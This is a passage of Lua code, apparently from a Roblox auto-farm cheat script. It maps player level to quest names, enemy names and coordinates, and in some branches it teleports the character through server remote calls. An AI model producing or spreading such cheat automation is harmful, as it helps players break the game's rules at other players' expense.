                                                                                                    local cframe = CFrame.new(-7859.09814, 5544.19043, -381.476196, -0.422592998, 0, 0.906319618, 0, 1, 0, -0.906319618, 0, -0.422592998)
                                                                                                    NVCf = cframe
                                                                                                    local cframe2 = CFrame.new(-7678.4897460938, 5566.4038085938, -497.21560668945)
                                                                                                    CfM = cframe2

                                                                                                    if _G.Level and (NVCf.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                                                                                        ReplicatedStorage2.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-7894.6176757813, 5547.1416015625, -380.29119873047))
                                                                                                    end
                                                                                                end
                                                                                            else
                                                                                                Mon = "God's Guard"
                                                                                                NVInfo = 1
                                                                                                NVCheck = "SkyExp1Quest"
                                                                                                MobInfo = "God's Guard"
                                                                                                local cframe = CFrame.new(-4721.88867, 843.874695, -1949.96643, 0.996191859, 0, -0.0871884301, 0, 1, 0, 0.0871884301, 0, 0.996191859)
                                                                                                NVCf = cframe
                                                                                                local cframe2 = CFrame.new(-4710.04296875, 845.27697753906, -1927.3079833984)
                                                                                                CfM = cframe2

                                                                                                if _G.Level and (NVCf.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                                                                                    ReplicatedStorage2.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-4607.82275, 872.54248, -1667.55688))
                                                                                                end
                                                                                            end
                                                                                        else
                                                                                            Mon = "Fishman Commando"
                                                                                            NVInfo = 2
                                                                                            NVCheck = "FishmanQuest"
                                                                                            MobInfo = "Fishman Commando"
                                                                                            local cframe = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
                                                                                            NVCf = cframe
                                                                                            local cframe2 = CFrame.new(61922.6328125, 18.482830047607, 1493.9343261719)
                                                                                            CfM = cframe2

                                                                                            if _G.Level and (NVCf.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                                                                                ReplicatedStorage2.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                                                                                            end
                                                                                        end
                                                                                    else
                                                                                        Mon = "Fishman Warrior"
                                                                                        NVInfo = 1
                                                                                        NVCheck = "FishmanQuest"
                                                                                        MobInfo = "Fishman Warrior"
                                                                                        local cframe = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
                                                                                        NVCf = cframe
                                                                                        local cframe2 = CFrame.new(60878.30078125, 18.482830047607, 1543.7574462891)
                                                                                        CfM = cframe2

                                                                                        if _G.Level and (NVCf.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                                                                            ReplicatedStorage2.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                                                                                        end
                                                                                    end
                                                                                else
                                                                                    Mon = "Military Spy"
                                                                                    NVInfo = 2
                                                                                    NVCheck = "MagmaQuest"
                                                                                    MobInfo = "Military Spy"
                                                                                    local cframe = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469)
                                                                                    NVCf = cframe
                                                                                    local cframe2 = CFrame.new(-5802.8681640625, 86.262413024902, 8828.859375)
                                                                                    CfM = cframe2
                                                                                end
                                                                            else
                                                                                Boubty = false
                                                                                Mon = "Military Soldier"
                                                                                NVInfo = 1
                                                                                NVCheck = "MagmaQuest"
                                                                                MobInfo = "Military Soldier"
                                                                                local cframe = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469)
                                                                                NVCf = cframe
                                                                                local cframe2 = CFrame.new(-5411.1645507812, 11.081554412842, 8454.29296875)
                                                                                CfM = cframe2
                                                                            end
                                                                        else
                                                                            Mon = "Gladiator"
                                                                            NVInfo = 2
                                                                            NVCheck = "ColosseumQuest"
                                                                            MobInfo = "Gladiator"
                                                                            local cframe = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0, 0.857167721, 0, -0.515037298)
                                                                            NVCf = cframe
                                                                            local cframe2 = CFrame.new(-1292.8381347656, 56.380882263184, -3339.0314941406)
                                                                            CfM = cframe2
                                                                        end
                                                                    else
                                                                        Mon = "Toga Warrior"
                                                                        NVInfo = 1
                                                                        NVCheck = "ColosseumQuest"
                                                                        MobInfo = "Toga Warrior"
                                                                        local cframe = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0, 0.857167721, 0, -0.515037298)
                                                                        NVCf = cframe
                                                                        local cframe2 = CFrame.new(-1820.21484375, 51.683856964111, -2740.6650390625)
                                                                        CfM = cframe2
                                                                    end
                                                                else
                                                                    Mon = "Dangerous Prisoner"
                                                                    NVInfo = 2
                                                                    NVCheck = "PrisonerQuest"
                                                                    MobInfo = "Dangerous Prisoner"
                                                                    local cframe = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                                                                    NVCf = cframe
                                                                    local cframe2 = CFrame.new(5654.5634765625, 15.633401870728, 866.29919433594)
                                                                    CfM = cframe2
                                                                end
                                                            else
                                                                Mon = "Prisoner"
                                                                NVInfo = 1
                                                                NVCheck = "PrisonerQuest"
                                                                MobInfo = "Prisoner"
                                                                local cframe = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                                                                NVCf = cframe
                                                                local cframe2 = CFrame.new(5098.9736328125, -0.3204058110714, 474.23733520508)
                                                                CfM = cframe2
                                                            end
                                                        else
                                                            Mon = "Dark Master"
                                                            NVInfo = 2
                                                            NVCheck = "SkyQuest"
                                                            MobInfo = "Dark Master"
                                                            local cframe = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                                                            NVCf = cframe
                                                            local cframe2 = CFrame.new(-5259.8447265625, 391.39767456055, -2229.0354003906)
                                                            CfM = cframe2
                                                        end
                                                    else
                                                        Mon = "Sky Bandit"
                                                        NVInfo = 1
                                                        NVCheck = "SkyQuest"
                                                        MobInfo = "Sky Bandit"
                                                        local cframe = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                                                        NVCf = cframe
                                                        local cframe2 = CFrame.new(-4953.20703125, 295.74420166016, -2899.2290039062)
                                                        CfM = cframe2
                                                    end
                                                else
                                                    Mon = "Chief Petty Officer"
                                                    NVInfo = 1
                                                    NVCheck = "MarineQuest2"
                                                    MobInfo = "Chief Petty Officer"
                                                    local cframe = CFrame.new(-5039.58643, 27.3500385, 4324.68018, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                                                    NVCf = cframe
                                                    local cframe2 = CFrame.new(-4881.2309570312, 22.652044296265, 4273.7524414062)
                                                    CfM = cframe2
                                                end
                                            else
                                                Mon = "Snowman"
                                                NVInfo = 2
                                                NVCheck = "SnowQuest"
                                                MobInfo = "Snowman"
                                                local cframe = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                                                NVCf = cframe
                                                local cframe2 = CFrame.new(6241.9951171875, 51.522083282471, -1243.9771728516)
                                                CfM = cframe2
                                            end
                                        else
                                            Mon = "Snow Bandit"
                                            NVInfo = 1
                                            NVCheck = "SnowQuest"
                                            MobInfo = "Snow Bandit"
                                            local cframe = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                                            NVCf = cframe
                                            local cframe2 = CFrame.new(1354.3479003906, 87.272773742676, -1393.9465332031)
                                            CfM = cframe2
                                        end
                                    else
                                        Mon = "Desert Officer"
                                        NVInfo = 2
                                        NVCheck = "DesertQuest"
                                        MobInfo = "Desert Officer"
                                        local cframe = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, 0, -0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693)
                                        NVCf = cframe
                                        local cframe2 = CFrame.new(1608.2822265625, 8.6142244338989, 4371.0073242188)
                                        CfM = cframe2
                                    end
                                else
                                    Mon = "Desert Bandit"
                                    NVInfo = 1
                                    NVCheck = "DesertQuest"
                                    MobInfo = "Desert Bandit"
                                    local cframe = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, 0, -0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693)
                                    NVCf = cframe
                                    local cframe2 = CFrame.new(924.7998046875, 6.4486746788025, 4481.5859375)
                                    CfM = cframe2
                                end
                            else
                                Mon = "Brute"
                                NVInfo = 2
                                NVCheck = "BuggyQuest1"
                                MobInfo = "Brute"
                                local cframe = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, 0, -0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627)
                                NVCf = cframe
                                local cframe2 = CFrame.new(-1140.0837402344, 14.809885025024, 4322.9213867188)
                                CfM = cframe2
                            end
                        else
                            Mon = "Pirate"
                            NVInfo = 1
                            NVCheck = "BuggyQuest1"
                            MobInfo = "Pirate"
                            local cframe = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, 0, -0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627)
                            NVCf = cframe
                            local cframe2 = CFrame.new(-1103.5134277344, 13.752052307129, 3896.0910644531)
                            CfM = cframe2
                        end
                    else
                        Mon = "Gorilla"
                        NVInfo = 2
                        NVCheck = "JungleQuest"
                        MobInfo = "Gorilla"
                        local cframe = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, 0, -1, 0, 0)
                        NVCf = cframe
                        local cframe2 = CFrame.new(-1129.8836669922, 40.46354675293, -525.42370605469)
                        CfM = cframe2
                    end
                else
                    Mon = "Monkey"
                    NVInfo = 1
                    NVCheck = "JungleQuest"
                    MobInfo = "Monkey"
                    local cframe = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, 0, -1, 0, 0)
                    NVCf = cframe
                    local cframe2 = CFrame.new(-1448.5180664062, 67.853012084961, 11.465796470642)
                    CfM = cframe2
                end
            elseif tostring(TeamSelf) == "Marines" then
                Mon = "Trainee"
                NVCheck = "MarineQuest"
                NVInfo = 1
                MobInfo = "Trainee"
                local cframe = CFrame.new(-2709.67944, 24.5206585, 2104.24585, -0.744724929, -3.97967455e-08, -0.667371571, 4.32403588e-08, 1, -1.07884304e-07, 0.667371571, -1.09201515e-07, -0.744724929)
                CfM = cframe
                local cframe2 = CFrame.new(-2709.67944, 24.5206585, 2104.24585, -0.744724929, -3.97967455e-08, -0.667371571, 4.32403588e-08, 1, -1.07884304e-07, 0.667371571, -1.09201515e-07, -0.744724929)
                NVCf = cframe2
            elseif tostring(TeamSelf) == "Pirates" then
                Mon = "Bandit"
                NVInfo = 1
                NVCheck = "BanditQuest1"
                MobInfo = "Bandit"
                local cframe = CFrame.new(1045.9626464844, 27.002508163452, 1560.8203125)
                CfM = cframe
                local cframe2 = CFrame.new(1045.9626464844, 27.002508163452, 1560.8203125)
                NVCf = cframe2
            end
        elseif World2 then
            if value ~= 700 and value > 724 then
                if value ~= 725 and value > 774 then
                    if value ~= 775 and value > 799 then
                        if value ~= 800 and value > 874 then
                            if value ~= 875 and value > 899 then
                                if value ~= 900 and value > 949 then
                                    if value ~= 950 and value > 974 then
                                        if value ~= 975 and value > 999 then
                                            if value ~= 1000 and value > 1049 then
                                                if value ~= 1050 and value > 1099 then
                                                    if value ~= 1100 and value > 1124 then
                                                        if value ~= 1125 and value > 1174 then
                                                            if value ~= 1175 and value > 1199 then
                                                                if value ~= 1200 and value > 1249 then
                                                                    if value ~= 1250 and value > 1274 then
                                                                        if value ~= 1275 and value > 1299 then
                                                                            if value ~= 1300 and value > 1324 then
                                                                                if value ~= 1325 and value > 1349 then
                                                                                    if value ~= 1350 and value > 1374 then
                                                                                        if value ~= 1375 and value > 1424 then
                                                                                            if value ~= 1425 and value > 1449 then
                                                                                                if value >= 1450 then
                                                                                                    Mon = "Water Fighter"
                                                                                                    NVInfo = 2
                                                                                                    NVCheck = "ForgottenQuest"
                                                                                                    MobInfo = "Water Fighter"
                                                                                                    local cframe = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, 0, -0.13915664, 0, 1, 0, 0.13915664, 0, 0.990270376)
                                                                                                    NVCf = cframe
                                                                                                    local cframe2 = CFrame.new(-3352.9013671875, 285.01556396484, -10534.841796875)
                                                                                                    CfM = cframe2
                                                                                                end
                                                                                            else
                                                                                                Mon = "Sea Soldier"
                                                                                                NVInfo = 1
                                                                                                NVCheck = "ForgottenQuest"
                                                                                                MobInfo = "Sea Soldier"
                                                                                                local cframe = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, 0, -0.13915664, 0, 1, 0, 0.13915664, 0, 0.990270376)
                                                                                                NVCf = cframe
                                                                                                local cframe2 = CFrame.new(-3028.2236328125, 64.674514770508, -9775.4267578125)
                                                                                                CfM = cframe2
                                                                                            end
                                                                                        else
                                                                                            Mon = "Snow Lurker"
                                                                                            NVInfo = 2
                                                                                            NVCheck = "FrostQuest"
                                                                                            MobInfo = "Snow Lurker"
                                                                                            local cframe = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                                                                                            NVCf = cframe
                                                                                            local cframe2 = CFrame.new(5407.0737304688, 69.194374084473, -6880.8803710938)
                                                                                            CfM = cframe2
                                                                                        end
                                                                                    else
                                                                                        Mon = "Arctic Warrior"
                                                                                        NVInfo = 1
                                                                                        NVCheck = "FrostQuest"
                                                                                        MobInfo = "Arctic Warrior"
                                                                                        local cframe = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                                                                                        NVCf = cframe
                                                                                        local cframe2 = CFrame.new(5966.24609375, 62.970020294189, -6179.3828125)
                                                                                        CfM = cframe2

                                                                                        if _G.Level and (NVCf.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                                                                            BTP(CfM)
                                                                                        end
                                                                                    end
                                                                                else
                                                                                    Mon = "Ship Officer"
                                                                                    NVInfo = 2
                                                                                    NVCheck = "ShipQuest2"
                                                                                    MobInfo = "Ship Officer"
                                                                                    local cframe = CFrame.new(968.80957, 125.092171, 33244.125)
                                                                                    NVCf = cframe
                                                                                    local cframe2 = CFrame.new(1036.0179443359, 181.4390411377, 33315.7265625)
                                                                                    CfM = cframe2

                                                                                    if _G.Level and (NVCf.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                                                                                        ReplicatedStorage2.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                                                                                    end
                                                                                end
                                                                            else
                                                                                Mon = "Ship Steward"
                                                                                NVInfo = 1
                                                                                NVCheck = "ShipQuest2"
                                                                                MobInfo = "Ship Steward"
                                                                                local cframe = CFrame.new(968.80957, 125.092171, 33244.125)
                                                                                NVCf = cframe
                                                                                local cframe2 = CFrame.new(919.43853759766, 129.55599975586, 33436.03515625)
                                                                                CfM = cframe2

                                                                                if _G.Level and (NVCf.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                                                                                    ReplicatedStorage2.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                                                                                end
                                                                            end
                                                                        else
                                                                            Mon = "Ship Engineer"
                                                                            NVInfo = 2
                                                                            NVCheck = "ShipQuest1"
                                                                            MobInfo = "Ship Engineer"
                                                                            local cframe = CFrame.new(1037.80127, 125.092171, 32911.6016)
                                                                            NVCf = cframe
                                                                            local cframe2 = CFrame.new(919.47863769531, 43.544013977051, 32779.96875)
                                                                            CfM = cframe2

                                                                            if _G.Level and (NVCf.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                                                                                ReplicatedStorage2.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                                                                            end
                                                                        end
                                                                    else
                                                                        Mon = "Ship Deckhand"
                                                                        NVInfo = 1
                                                                        NVCheck = "ShipQuest1"
                                                                        MobInfo = "Ship Deckhand"
                                                                        local cframe = CFrame.new(1037.80127, 125.092171, 32911.6016)
                                                                        NVCf = cframe
                                                                        local cframe2 = CFrame.new(1212.0111083984, 150.79205322266, 33059.24609375)
                                                                        CfM = cframe2

                                                                        if _G.Level and (NVCf.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                                                                            ReplicatedStorage2.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                                                                        end
                                                                    end
                                                                else
                                                                    Mon = "Lava Pirate"
                                                                    NVInfo = 2
                                                                    NVCheck = "FireSideQuest"
                                                                    MobInfo = "Lava Pirate"
                                                                    local cframe = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                                                                    NVCf = cframe
                                                                    local cframe2 = CFrame.new(-5213.3315429688, 49.737880706787, -4701.451171875)
                                                                    CfM = cframe2
                                                                end
                                                            else
                                                                Mon = "Magma Ninja"
                                                                NVInfo = 1
                                                                NVCheck = "FireSideQuest"
                                                                MobInfo = "Magma Ninja"
                                                                local cframe = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                                                                NVCf = cframe
                                                                local cframe2 = CFrame.new(-5449.6728515625, 76.658744812012, -5808.2006835938)
                                                                CfM = cframe2
                                                            end
                                                        else
                                                            Mon = "Horned Warrior"
                                                            NVInfo = 2
                                                            NVCheck = "IceSideQuest"
                                                            MobInfo = "Horned Warrior"
                                                            local cframe = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578)
                                                            NVCf = cframe
                                                            local cframe2 = CFrame.new(-6341.3666992188, 15.951770782471, -5723.162109375)
                                                            CfM = cframe2
                                                        end
                                                    else
                                                        Mon = "Lab Subordinate"
                                                        NVInfo = 1
                                                        NVCheck = "IceSideQuest"
                                                        MobInfo = "Lab Subordinate"
                                                        local cframe = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578)
                                                        NVCf = cframe
                                                        local cframe2 = CFrame.new(-5707.4716796875, 15.951709747314, -4513.3920898438)
                                                        CfM = cframe2
                                                    end
                                                else
                                                    Mon = "Winter Warrior"
                                                    NVInfo = 2
                                                    NVCheck = "SnowMountainQuest"
                                                    MobInfo = "Winter Warrior"
                                                    local cframe = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                                                    NVCf = cframe
                                                    local cframe2 = CFrame.new(1142.7451171875, 475.63980102539, -5199.4165039062)
                                                    CfM = cframe2
                                                end
                                            else
                                                Mon = "Snow Trooper"
                                                NVInfo = 1
                                                NVCheck = "SnowMountainQuest"
                                                MobInfo = "Snow Trooper"
                                                local cframe = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                                                NVCf = cframe
                                                local cframe2 = CFrame.new(549.14733886719, 427.38705444336, -5563.6987304688)
                                                CfM = cframe2
                                            end
                                        else
                                            Mon = "Vampire"
                                            NVInfo = 2
                                            NVCheck = "ZombieQuest"
                                            MobInfo = "Vampire"
                                            local cframe = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                                            NVCf = cframe
                                            local cframe2 = CFrame.new(-6037.66796875, 32.184638977051, -1340.6597900391)
                                            CfM = cframe2
                                        end
                                    else
                                        Mon = "Zombie"
                                        NVInfo = 1
                                        NVCheck = "ZombieQuest"
                                        MobInfo = "Zombie"
                                        local cframe = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                                        NVCf = cframe
                                        local cframe2 = CFrame.new(-5657.7768554688, 78.969734191895, -928.68701171875)
                                        CfM = cframe2
                                    end
                                else
                                    Mon = "Marine Captain"
                                    NVInfo = 2
                                    NVCheck = "MarineQuest3"
                                    MobInfo = "Marine Captain"
                                    local cframe = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                                    NVCf = cframe
                                    local cframe2 = CFrame.new(-1861.2310791016, 80.176582336426, -3254.6975097656)
                                    CfM = cframe2
                                end
                            else
                                Mon = "Marine Lieutenant"
                                NVInfo = 1
                                NVCheck = "MarineQuest3"
                                MobInfo = "Marine Lieutenant"
                                local cframe = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                                NVCf = cframe
                                local cframe2 = CFrame.new(-2821.3723144531, 75.897277832031, -3070.0891113281)
                                CfM = cframe2
                            end
                        else
                            Mon = "Factory Staff"
                            NVCheck = "Area2Quest"
                            NVInfo = 2
                            MobInfo = "Factory Staff"
                            local cframe = CFrame.new(632.698608, 73.1055908, 918.666321, -0.0319722369, 8.96074881e-10, -0.999488771, 1.36326533e-10, 1, 8.92172336e-10, 0.999488771, -1.07732087e-10, -0.0319722369)
                            NVCf = cframe
                            local cframe2 = CFrame.new(73.078674316406, 81.863441467285, -27.470672607422)
                            CfM = cframe2
                        end
                    else
                        Mon = "Swan Pirate"
                        NVInfo = 1
                        NVCheck = "Area2Quest"
                        MobInfo = "Swan Pirate"
                        local cframe = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
                        NVCf = cframe
                        local cframe2 = CFrame.new(1068.6643066406, 137.61428833008, 1322.1060791016)
                        CfM = cframe2
                    end
                else
                    Mon = "Mercenary"
                    NVInfo = 2
                    NVCheck = "Area1Quest"
                    MobInfo = "Mercenary"
                    local cframe = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                    NVCf = cframe
                    local cframe2 = CFrame.new(-1004.3244018555, 80.158866882324, 1424.6193847656)
                    CfM = cframe2
                end
            else
                Mon = "Raider"
                NVInfo = 1
                NVCheck = "Area1Quest"
                MobInfo = "Raider"
                local cframe = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                NVCf = cframe
                local cframe2 = CFrame.new(-728.32672119141, 52.779319763184, 2345.7705078125)
                CfM = cframe2
            end
        elseif World3 then
            if value ~= 1500 and value > 1524 then
                if value ~= 1525 and value > 1574 then
                    if value ~= 1575 and value > 1599 then
                        if value ~= 1600 and value > 1624 then
                            if value ~= 1625 and value > 1649 then
                                if value ~= 1650 and value > 1699 then
                                    if value ~= 1700 and value > 1724 then
                                        if value ~= 1725 and value > 1774 then
                                            if value ~= 1775 and value > 1799 then
                                                if value ~= 1800 and value > 1824 then
                                                    if value ~= 1825 and value > 1849 then
                                                        if value ~= 1850 and value > 1899 then
                                                            if value ~= 1900 and value > 1924 then
                                                                if value ~= 1925 and value > 1974 then
                                                                    if value ~= 1975 and value > 1999 then
                                                                        if value ~= 2000 and value > 2024 then
                                                                            if value ~= 2025 and value > 2049 then
                                                                                if value ~= 2050 and value > 2074 then
                                                                                    if value ~= 2075 and value > 2099 then
                                                                                        if value ~= 2100 and value > 2124 then
                                                                                            if value ~= 2125 and value > 2149 then
                                                                                                if value ~= 2150 and value > 2199 then
                                                                                                    if value ~= 2200 and value > 2224 then
                                                                                                        if value ~= 2225 and value > 2249 then
                                                                                                            if value ~= 2250 and value > 2274 then
                                                                                                                if value ~= 2275 and value > 2299 then
                                                                                                                    if value ~= 2300 and value > 2324 then
                                                                                                                        if value ~= 2325 and value > 2349 then
                                                                                                                            if value ~= 2350 and value > 2374 then
                                                                                                                                if value ~= 2375 and value > 2399 then
                                                                                                                                    if value ~= 2400 and value > 2449 then
                                                                                                                                        if value ~= 2450 and value > 2474 then
                                                                                                                                            if value ~= 2475 and value > 2499 then
                                                                                                                                                if value ~= 2500 and value > 2524 then
                                                                                                                                                    if value ~= 2525 and value > 2550 then
                                                                                                                                                        if value >= 2551 and value <= 2574 then
                                                                                                                                                            Mon = "Serpent Hunter"
                                                                                                                                                            NVInfo = 1
                                                                                                                                                            NVCheck = "TikiQuest3"
                                                                                                                                                            MobInfo = "Serpent Hunter"
                                                                                                                                                            local cframe = CFrame.new(-16679.4785, 176.7473, 1474.3995)
                                                                                                                                                            NVCf = cframe
                                                                                                                                                            local cframe2 = CFrame.new(-16679.4785, 176.7473, 1474.3995)
                                                                                                                                                            CfM = cframe2
                                                                                                                                                        elseif value >= 2575 and value <= 2599 then
                                                                                                                                                            Mon = "Skull Slayer"
                                                                                                                                                            NVInfo = 2
                                                                                                                                                            NVCheck = "TikiQuest3"
                                                                                                                                                            MobInfo = "Skull Slayer"
                                                                                                                                                            local cframe = CFrame.new(-16759.5898, 71.2837, 1595.3399)
                                                                                                                                                            NVCf = cframe
                                                                                                                                                            local cframe2 = CFrame.new(-16759.5898, 71.2837, 1595.3399)
                                                                                                                                                            CfM = cframe2
                                                                                                                                                            local character3 = localPlayer.Character
                                                                                                                                                            local result = character3 or localPlayer.CharacterAdded:Wait()
                                                                                                                                                            result:WaitForChild("HumanoidRootPart")
                                                                                                                                                            local ReplicatedStorage4 = game:GetService("ReplicatedStorage")
                                                                                                                                                            local flag8 = false

                                                                                                                                                            TravelSubmerged = function(arg)
                                                                                                                                                                if flag8 then
                                                                                                                                                                    return
                                                                                                                                                                end
                                                                                                                                                                flag8 = true
                                                                                                                                                                Tween(CFrame.new(-16269.16, 25.26, 1373.38))
                                                                                                                                                                task.wait(1)
                                                                                                                                                                ReplicatedStorage4.Modules.Net["RF/SubmarineWorkerSpeak"]:InvokeServer("TravelToSubmergedIsland")
                                                                                                                                                                task.wait(1)
                                                                                                                                                            end

                                                                                                                                                            if value ~= nil then
                                                                                                                                                                flag8 = false
                                                                                                                                                            end
                                                                                                                                                        elseif value >= 2600 and value <= 2624 then
                                                                                                                                                            Mon = "Reef Bandit"
                                                                                                                                                            NVInfo = 1
                                                                                                                                                            NVCheck = "SubmergedQuest1"
                                                                                                                                                            MobInfo = "Reef Bandit"
                                                                                                                                                            local cframe = CFrame.new(10882.264, -2086.322, 10034.226)
                                                                                                                                                            NVCf = cframe
                                                                                                                                                            local cframe2 = CFrame.new(10736.6191, -2087.8439, 9338.4882)
                                                                                                                                                            CfM = cframe2
                                                                                                                                                        elseif value >= 2625 and value <= 2649 then
                                                                                                                                                            Mon = "Coral Pirate"
                                                                                                                                                            NVInfo = 2
                                                                                                                                                            NVCheck = "SubmergedQuest1"
                                                                                                                                                            MobInfo = "Coral Pirate"
                                                                                                                                                            local cframe = CFrame.new(10882.264, -2086.322, 10034.226)
                                                                                                                                                            NVCf = cframe
                                                                                                                                                            local cframe2 = CFrame.new(10965.1025, -2158.8842, 9177.2597)
                                                                                                                                                            CfM = cframe2
                                                                                                                                                        elseif value >= 2650 and value <= 2674 then
                                                                                                                                                            Mon = "Sea Chanter"
                                                                                                                                                            NVInfo = 1
                                                                                                                                                            NVCheck = "SubmergedQuest2"
                                                                                                                                                            MobInfo = "Sea Chanter"
                                                                                                                                                            local cframe = CFrame.new(10882.264, -2086.322, 10034.226)
                                                                                                                                                            NVCf = cframe
                                                                                                                                                            local cframe2 = CFrame.new(10621.0342, -2087.844, 10102.0332)
                                                                                                                                                            CfM = cframe2
                                                                                                                                                        elseif value >= 2675 and value <= 2699 then
                                                                                                                                                            Mon = "Ocean Prophet"
                                                                                                                                                            NVInfo = 2
                                                                                                                                                            NVCheck = "SubmergedQuest2"
                                                                                                                                                            MobInfo = "Ocean Prophet"
                                                                                                                                                            local cframe = CFrame.new(10882.264, -2086.322, 10034.226)
                                                                                                                                                            NVCf = cframe
                                                                                                                                                            local cframe2 = CFrame.new(11056.1445, -2001.6717, 10117.4493)
                                                                                                                                                            CfM = cframe2
                                                                                                                                                        elseif value >= 2700 and value <= 2724 then
                                                                                                                                                            Mon = "High Disciple"
                                                                                                                                                            NVInfo = 1
                                                                                                                                                            NVCheck = "SubmergedQuest3"
                                                                                                                                                            MobInfo = "High Disciple"
                                                                                                                                                            local cframe = CFrame.new(9636.34961, -1992.26013, 9613.07715, -0.596759319, -5.84091993e-08, -0.802420259, -9.79421415e-08, 1, 4.82141341e-11, 0.802420259, 7.86195287e-08, -0.596759319)
                                                                                                                                                            NVCf = cframe
                                                                                                                                                            local cframe2 = CFrame.new(9828.087890625, -1940.9089355469, 9693.0634765625)
                                                                                                                                                            CfM = cframe2
                                                                                                                                                        elseif value >= 2725 and value <= 2800 then
                                                                                                                                                            Mon = "Grand Devotee"
                                                                                                                                                            NVInfo = 2
